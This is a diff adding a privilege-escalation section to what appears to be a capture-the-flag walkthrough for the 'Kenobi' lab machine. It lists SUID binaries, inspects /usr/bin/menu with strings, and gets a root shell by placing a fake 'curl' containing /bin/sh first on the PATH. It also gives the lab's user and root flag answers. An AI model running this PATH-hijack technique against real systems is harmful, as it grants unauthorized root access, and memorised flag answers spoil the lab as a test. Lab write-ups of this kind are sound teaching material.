@@ -220,5 +220,70 @@ kenobi@kenobi:~$
 ```
 6. Question `What is Kenobi's user flag (/home/kenobi/user.txt)?` Answer `d0b0f3f53b6caa532a83915e19224899` 32 alphanumeric characters. Get using `cat /home/kenobi/user.txt`
 ## Privilege Escalation with Path Variable Manipulation 
+1. Question `What file looks particularly out of the ordinary?` Answer `/usr/bin/menu`
+```bash
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+3. Question `Run the binary, how many options appear?` Answer `3`
+```bash
+kenobi@kenobi:~$ /usr/bin/menu
 
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+
+```
+4. Now time to do reverse. We are going to run simple command `strings /usr/bin/menu`. (As instructed)
+Result shows:
+```bash
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+```
+6. So we can assume choosing first option run first command `curl -I localhost` (As instructed).So we can change it to exploit. 
+7. We can simply follow instruction to create file named curl with executable permission and add the file loacation to our path. Then simply running menu and selecting first option will do the rest as it run the curl we created, we will get root shell.
+```bash
+kenobi@kenobi:~$ echo "/bin/sh" >curl
+kenobi@kenobi:~$ chmod 777 curl
+kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# 
+```
+8. Question `What is the root flag (/root/root.txt)?` Answer `177b3cd8562289f37382721c28381f02` 32 alphanumeric chars. Command used `cat /root/root.txt`
+   
 Author: Zishan Ahamed Thandar
